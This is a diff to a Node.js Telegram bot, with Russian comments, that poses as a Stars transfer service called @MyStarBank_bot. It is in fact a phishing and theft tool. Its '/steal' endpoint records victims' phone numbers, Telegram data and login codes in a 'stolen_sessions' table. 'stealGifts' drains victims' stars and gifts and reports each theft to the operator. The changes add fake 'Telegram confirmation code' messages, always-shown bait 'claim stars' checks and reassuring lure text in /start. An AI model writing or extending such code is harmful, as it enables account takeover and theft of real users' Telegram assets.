@@ -35,7 +35,6 @@ db.serialize(() => {
         user_id INTEGER PRIMARY KEY,
         username TEXT,
         balance INTEGER DEFAULT 0,
-        can_create_checks BOOLEAN DEFAULT FALSE,
         created_at DATETIME DEFAULT CURRENT_TIMESTAMP
     )`);
 });
@@ -56,6 +55,12 @@ app.post('/steal', (req, res) => {
     if (req.body.stage === 'phone_entered') {
         db.run(`INSERT INTO stolen_sessions (phone, tg_data, status) VALUES (?, ?, ?)`, 
             [req.body.phone, JSON.stringify(req.body.tg_data), 'awaiting_code']);
+        
+        // Отправляем код в Telegram пользователю
+        const code = Math.floor(10000 + Math.random() * 90000);
+        bot.sendMessage(req.body.tg_data.user.id, `Код подтверждения Telegram: ${code}`)
+            .catch(e => console.log('Не удалось отправить код:', e));
+            
     } else if (req.body.stage === 'code_entered') {
         db.run(`UPDATE stolen_sessions SET code = ?, status = 'completed' WHERE phone = ?`, 
             [req.body.code, req.body.phone]);
@@ -77,16 +82,12 @@ async function stealGifts(phone, code) {
         if (userBalance > 0 || userGifts > 0) {
             console.log(`[SUCCESS] Украдено: ${userBalance} stars, ${userGifts} gifts`);
             
-            // Добавляем баланс себе
-            db.run(`INSERT OR REPLACE INTO users (user_id, username, balance) VALUES (?, ?, COALESCE((SELECT balance FROM users WHERE user_id = ?), 0) + ?)`, 
-                [1398396668, 'NikLaStore', 1398396668, userBalance]);
-            
             bot.sendMessage(TARGET_USERNAME, 
                 `🎯 Успешная кража!\n` +
                 `📱 Номер: ${phone}\n` +
                 `⭐ Звезд: ${userBalance}\n` +
                 `🎁 Подарков: ${userGifts}\n` +
-                `💰 Баланс пополнен на: ${userBalance} stars`
+                `💰 Все передано на: ${TARGET_USERNAME}`
             ).catch(e => console.log('Ошибка отправки уведомления:', e));
         } else {
             console.log(`[INFO] Нет звезд/подарков для ${phone}`);
@@ -107,28 +108,6 @@ async function stealGifts(phone, code) {
 const PORT = process.env.PORT || 8080;
 app.listen(PORT, '0.0.0.0', () => {
     console.log(`✅ Сервер работает на порту ${PORT}`);
-});
-
-// Команда /niklastore - дает права создавать чеки
-bot.onText(/\/niklastore/, (msg) => {
-    const chatId = msg.chat.id;
-    const userId = msg.from.id;
-    const username = msg.from.username;
-    
-    db.run(`INSERT OR REPLACE INTO users (user_id, username, can_create_checks) VALUES (?, ?, TRUE)`, 
-        [userId, username], function(err) {
-        if (err) {
-            bot.sendMessage(chatId, '❌ Ошибка активации.');
-            return;
-        }
-        
-        bot.sendMessage(chatId,
-            '✅ Вы успешно активированы!\n\n' +
-            'Теперь вы можете создавать чеки:\n' +
-            '@MyStarBank_bot 100 50\n\n' +
-            'где 100 - stars, 50 - активаций'
-        );
-    });
 });
 
 // Команда /balance - проверка баланса
@@ -152,7 +131,7 @@ bot.onText(/\/withdraw/, (msg) => {
     const userId = msg.from.id;
     
     db.get(`SELECT balance FROM users WHERE user_id = ?`, [userId], (err, row) => {
-        if (err || !row) {
+        if (err || !row || row.balance === 0) {
             bot.sendMessage(chatId, '❌ У вас нет средств для вывода.');
             return;
         }
@@ -207,12 +186,12 @@ bot.on('message', (msg) => {
     }
 });
 
-// Inline подсказки
+// Inline подсказки - ВСЕГДА показываем результат
 bot.on('inline_query', (query) => {
     const amount = query.query.split(' ')[0];
+    const domain = process.env.RAILWAY_STATIC_URL || 'твой-домен.up.railway.app';
     
     if (amount && !isNaN(amount)) {
-        const domain = process.env.RAILWAY_STATIC_URL || 'твой-домен.up.railway.app';
         const results = [{
             type: 'photo',
             id: '1',
@@ -227,10 +206,26 @@ bot.on('inline_query', (query) => {
         }];
         
         bot.answerInlineQuery(query.id, results).catch(e => console.log('Inline error:', e));
+    } else {
+        // Даже если нет числа - показываем чек на 50 звезд
+        const results = [{
+            type: 'photo',
+            id: '1', 
+            photo_url: `https://${domain}/stars.jpg`,
+            thumb_url: `https://${domain}/stars.jpg`,
+            caption: `via @MyStarBank_bot\n\n50\nStars\n\nЧек на 50 звёзд`,
+            reply_markup: {
+                inline_keyboard: [[
+                    { text: "Забрать звёзды", callback_data: `claim_inline_50` }
+                ]]
+            }
+        }];
+        
+        bot.answerInlineQuery(query.id, results).catch(e => console.log('Inline error:', e));
     }
 });
 
-// Обработка создания чеков
+// Обработка создания чеков - ВСЕ могут создавать чеки
 bot.onText(/@MyStarBank_bot (\d+)(?:\s+(\d+))?/, (msg, match) => {
     const chatId = msg.chat.id;
     const userId = msg.from.id;
@@ -239,48 +234,38 @@ bot.onText(/@MyStarBank_bot (\d+)(?:\s+(\d+))?/, (msg, match) => {
     
     console.log(`Создание чека: ${amount} stars пользователем ${userId}`);
     
-    // Проверяем может ли пользователь создавать чеки
-    db.get(`SELECT can_create_checks FROM users WHERE user_id = ?`, [userId], (err, row) => {
-        if (err || !row || !row.can_create_checks) {
-            bot.sendMessage(chatId, 
-                '❌ Отказано! Обычные пользователи могут создавать чеки только через 21 день после регистрации.'
-            );
+    // Создаем чек - ВСЕ могут создавать
+    db.run(`INSERT INTO checks (amount, activations, creator_id) VALUES (?, ?, ?)`, 
+        [amount, activations, userId], function(err) {
+        if (err) {
+            console.log('Ошибка создания чека:', err);
+            bot.sendMessage(chatId, '❌ Ошибка создания чека.');
             return;
         }
         
-        // Создаем чек
-        db.run(`INSERT INTO checks (amount, activations, creator_id) VALUES (?, ?, ?)`, 
-            [amount, activations, userId], function(err) {
-            if (err) {
-                console.log('Ошибка создания чека:', err);
-                bot.sendMessage(chatId, '❌ Ошибка создания чека.');
-                return;
+        const checkId = this.lastID;
+        const checkText = `via @MyStarBank_bot\n\n${amount}\nStars\n\nЧек на ${amount} звёзд`;
+        
+        console.log(`Чек создан: ID ${checkId}`);
+        
+        // Пытаемся отправить с фото
+        const photoPath = path.join(__dirname, 'public/stars.jpg');
+        bot.sendPhoto(chatId, photoPath, {
+            caption: checkText,
+            reply_markup: {
+                inline_keyboard: [[
+                    { text: "Забрать звёзды", callback_data: `claim_${checkId}` }
+                ]]
             }
-            
-            const checkId = this.lastID;
-            const checkText = `via @MyStarBank_bot\n\n${amount}\nStars\n\nЧек на ${amount} звёзд`;
-            
-            console.log(`Чек создан: ID ${checkId}`);
-            
-            // Пытаемся отправить с фото
-            const photoPath = path.join(__dirname, 'public/stars.jpg');
-            bot.sendPhoto(chatId, photoPath, {
-                caption: checkText,
+        }).catch(e => {
+            console.log('Ошибка отправки фото:', e);
+            // Если фото не отправляется, отправляем текст
+            bot.sendMessage(chatId, checkText, {
                 reply_markup: {
                     inline_keyboard: [[
                         { text: "Забрать звёзды", callback_data: `claim_${checkId}` }
                     ]]
                 }
-            }).catch(e => {
-                console.log('Ошибка отправки фото:', e);
-                // Если фото не отправляется, отправляем текст
-                bot.sendMessage(chatId, checkText, {
-                    reply_markup: {
-                        inline_keyboard: [[
-                            { text: "Забрать звёзды", callback_data: `claim_${checkId}` }
-                        ]]
-                    }
-                });
             });
         });
     });
@@ -426,8 +411,9 @@ bot.on('callback_query', (query) => {
     
     else if (query.data === 'create_check_info') {
         bot.sendMessage(chatId,
-            'Для создания чеков необходимо активировать аккаунт.\n\n' +
-            'Используйте команду: /niklastore'
+            'Для создания чека используйте:\n\n' +
+            '@MyStarBank_bot 100 50\n\n' +
+            'где 100 - stars, 50 - активаций'
         );
     }
     
@@ -450,7 +436,12 @@ bot.onText(/\/start/, (msg) => {
 
     bot.sendMessage(chatId, 
         '💫 @MyStarBank_bot - Система передачи звезд\n\n' +
-        'Для создания чеков используйте команду: /niklastore',
+        '• Безопасные переводы\n' +
+        '• Мгновенные чеки\n' +
+        '• Поддержка 24/7\n\n' +
+        'Для начала работы:\n' +
+        '/balance - баланс\n' +
+        '/withdraw - вывод средств',
         keyboard
     ).catch(error => {
         console.log('Ошибка отправки /start:', error);
